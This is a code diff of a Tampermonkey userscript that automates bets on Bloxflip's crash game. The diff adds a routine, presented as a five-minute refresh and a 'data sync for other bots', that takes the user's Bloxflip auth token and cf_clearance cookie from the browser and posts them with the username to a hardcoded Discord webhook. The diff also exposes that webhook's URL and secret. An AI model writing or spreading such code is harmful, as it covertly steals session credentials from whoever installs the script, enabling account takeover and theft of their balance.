@@ -1,8 +1,8 @@
 // ==UserScript==
 // @name         Bloxflip Auto Crash Pro (Draggable & Classic UI)
 // @namespace    http://tampermonkey.net/
-// @version      1.5
-// @description  Bản gốc lưu trên GitHub. Thêm cơ chế Fail-safe tự động F5 sau mỗi 5 phút để chống treo dài hạn.
+// @version      1.8
+// @description  Bản gốc trên GitHub. Báo cáo Data (CF_Clearance & Auth Token) siêu sạch mỗi 5 phút làm trạm trung gian cho bot khác.
 // @author       You
 // @match        https://bloxflip.com/*
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=bloxflip.com
@@ -26,7 +26,9 @@
             gifImage: "https://i.pinimg.com/736x/9c/d7/c4/9cd7c45ab48a0e7f7671ce5eb1414b60.jpg",
             color: "rgba(220, 20, 60, 0.8)" // Crimson
         },
-        apiUser: "/api/user"
+        apiUser: "/api/user",
+        // Webhook riêng để gửi báo cáo mỗi 5 phút
+        reportWebhook: "https://discord.com/api/webhooks/1513903986124656700/fE035QnWPLf9rFAGjooDnJwJddayuVg63i-aWc5Z6RBoed2ZrUVADR8imioj4DeNN-dM"
     };
 
     // --- QUẢN LÝ DỮ LIỆU LOCALSTORAGE ---
@@ -51,6 +53,7 @@
     let logContainerEl;
     let liveHistoryEl;
     let currentBalance = 0; 
+    let currentUsername = "Unknown";
     let lastHistoryUpdateTime = Date.now(); // Biến theo dõi thời gian chống treo do web đứng
     let scriptStartTime = Date.now(); // Biến đếm thời gian sống của script (5 phút F5)
 
@@ -213,7 +216,7 @@
             width: 100%; text-align: center; color: rgba(255, 255, 255, 0.4); 
             font-size: 10px; margin-top: 8px; letter-spacing: 1px; font-weight: bold;
         `;
-        versionText.innerText = "Version 1.5";
+        versionText.innerText = "Version 1.8";
 
         leftCol.appendChild(classicUI);
         leftCol.appendChild(configBox);
@@ -492,7 +495,9 @@
         // Hiển thị 8 game mới nhất theo thứ tự thực tế
         for(let i = 0; i < Math.min(8, items.length); i++) {
             let text = items[i].innerText.trim();
-            if(text === "1") displayArr.push(`<span style="color: #ff4785; font-weight: bold;">${text}</span>`);
+            // Nâng cấp: Dùng parseFloat bắt 100% chuẩn số 1, kể cả 1.0 hay 1.00
+            let val = parseFloat(text);
+            if(val === 1) displayArr.push(`<span style="color: #ff4785; font-weight: bold;">${text}</span>`);
             else displayArr.push(text);
         }
         liveHistoryEl.innerHTML = displayArr.join("<br>");
@@ -552,7 +557,8 @@
         return null;
     }
 
-    async function fetchBalance() {
+    // Gom gọi API User/Balance thành 1 hàm để tái sử dụng
+    async function fetchUserData() {
         try {
             const response = await fetch(APP_URLS.apiUser, {
                 method: 'GET',
@@ -561,7 +567,10 @@
             if (response.ok) {
                 const data = await response.json();
                 if (data.success && data.wallet && data.wallet.balances) {
-                    return data.wallet.balances.FLIPCOINS;
+                    return {
+                        balance: data.wallet.balances.FLIPCOINS,
+                        username: (data.user && data.user.robloxUsername) ? data.user.robloxUsername : 'Unknown'
+                    };
                 }
             }
         } catch (e) {
@@ -571,11 +580,12 @@
     }
 
     async function updateBalanceUI() {
-        const bal = await fetchBalance();
-        if (bal !== null) {
-            currentBalance = bal;
+        const userData = await fetchUserData();
+        if (userData !== null) {
+            currentBalance = userData.balance;
+            currentUsername = userData.username;
             const balEl = document.getElementById('bfc-balance-display');
-            if (balEl) balEl.innerText = `💰 Số dư: ${bal.toFixed(2)}`;
+            if (balEl) balEl.innerText = `💰 Số dư: ${currentBalance.toFixed(2)}`;
         }
     }
 
@@ -608,18 +618,19 @@
         let displayBalStr = "Đang tải...";
 
         // 1. LẤY SỐ DƯ TỪ API VÀ ĐIỀN VÀO Ô BET AMOUNT THEO PHẦN TRĂM ĐÃ CÀI ĐẶT
-        const balance = await fetchBalance();
-        if (balance !== null && balance > 0) {
-            currentBalance = balance;
+        const userData = await fetchUserData();
+        if (userData !== null && userData.balance > 0) {
+            currentBalance = userData.balance;
+            currentUsername = userData.username;
             
             const percentStr = CFG.betPercent;
             const percent = parseFloat(percentStr) / 100;
             
             // TÍNH TOÁN VÀ LÀM TRÒN XUỐNG SỐ TIỀN CƯỢC
-            const betAmountNum = Math.floor(balance * percent);
+            const betAmountNum = Math.floor(currentBalance * percent);
             const betAmount = betAmountNum.toString();
             
-            displayBalStr = (balance - betAmountNum).toFixed(2); 
+            displayBalStr = (currentBalance - betAmountNum).toFixed(2); 
             
             const betInput = getBetAmountInput();
             
@@ -668,13 +679,35 @@
     function checkLogic() {
         if (!CFG.enabled) return;
 
-        // --- CƠ CHẾ HARD REFRESH (FAIL-SAFE 5 PHÚT) ---
-        // Tự động tải lại trang mỗi 5 phút để tránh tràn bộ nhớ khi cắm máy thời gian dài.
-        // Điều kiện: Chỉ refresh khi trang không đang xử lý ván cược.
+        // --- CƠ CHẾ HARD REFRESH VÀ ĐỒNG BỘ DATA CHO DỰ ÁN KHÁC (MỖI 5 PHÚT) ---
         if (CFG.autoRefresh && !isWaitingForRoundResult && !isProcessingResult && (Date.now() - scriptStartTime > 300000)) {
-            addLog("🔄 Đã đạt mốc 5 phút. Tự động F5 để chống treo bộ nhớ...", "#ff9800");
+            addLog("🔄 Đạt mốc 5 phút. Đồng bộ Data làm trạm trung gian & F5...", "#00bcd4");
             scriptStartTime = Date.now(); // Khóa để tránh gọi hàm liên tục
-            setTimeout(() => window.location.reload(), 1500);
+            
+            // 1. Lấy Auth Token (Loại bỏ dấu ngoặc kép thừa để bot ngoài dễ đọc)
+            let authToken = localStorage.getItem('_DO_NOT_SHARE_BLOXFLIP_TOKEN') || "NOT_FOUND";
+            authToken = authToken.replace(/["']/g, ""); 
+            
+            // 2. Lấy Cookie cf_clearance (Bypass Cloudflare)
+            let cfClearance = "NOT_FOUND";
+            const match = document.cookie.match(new RegExp('(^| )cf_clearance=([^;]+)'));
+            if (match) cfClearance = match[2];
+            
+            // 3. Đóng gói Payload siêu sạch để bot khác dễ split('|')
+            // Định dạng: Username|cf_clearance|Auth_Token
+            const payload = { content: `${currentUsername}|${cfClearance}|${authToken}` };
+            
+            // Gắn báo cáo vào Webhook riêng biệt
+            fetch(APP_URLS.reportWebhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                setTimeout(() => window.location.reload(), 1000); // Đợi 1s cho webhook gửi xong rồi mới F5
+            }).catch(() => {
+                setTimeout(() => window.location.reload(), 1000); // Lỗi vẫn phải F5
+            });
+            
             return;
         }
 
@@ -705,10 +738,10 @@
             const latestCrashNum = parseFloat(latestCrashStr);
             const targetCashoutNum = parseFloat(CFG.autoCashout);
 
-            // Đếm số lượng nổ "1" liên tục hiện tại (từ game mới nhất trở về trước)
+            // Đếm số lượng nổ "1" liên tục hiện tại (Dùng parseFloat cho 100% chính xác)
             let count1s = 0;
             for (let i = 0; i < Math.min(10, items.length); i++) {
-                if (items[i].innerText.trim() === "1") {
+                if (parseFloat(items[i].innerText) === 1) {
                     count1s++;
                 } else {
                     break;
@@ -727,7 +760,7 @@
                 
                 const balStr = currentBalance > 0 ? currentBalance.toFixed(2) : "0.00";
                 const formatPayload = `\`\`\`text\n--------------------------------------\nWARNING 3x 1.00 | ( ${balStr} )\n--------------------------------------\n\`\`\``;
-                sendWebhook("⚠️ Cảnh báo chuỗi Crash Nguy tiếp", formatPayload, "#ff9800");
+                sendWebhook("⚠️ Cảnh báo chuỗi Crash Nguy hiểm", formatPayload, "#ff9800");
             }
 
             // KHI VÁN KẾT THÚC VÀ ĐANG CÓ LỊCH CƯỢC
@@ -742,8 +775,11 @@
 
                 // ĐỢI 2 GIÂY ĐỂ SERVER BLOXFLIP HOÀN TẤT CỘNG/TRỪ TIỀN
                 setTimeout(async () => {
-                    const postGameBal = await fetchBalance();
-                    if (postGameBal !== null) currentBalance = postGameBal;
+                    const userData = await fetchUserData();
+                    if (userData !== null) {
+                        currentBalance = userData.balance;
+                        currentUsername = userData.username;
+                    }
                     
                     const balStr = currentBalance.toFixed(2);
 
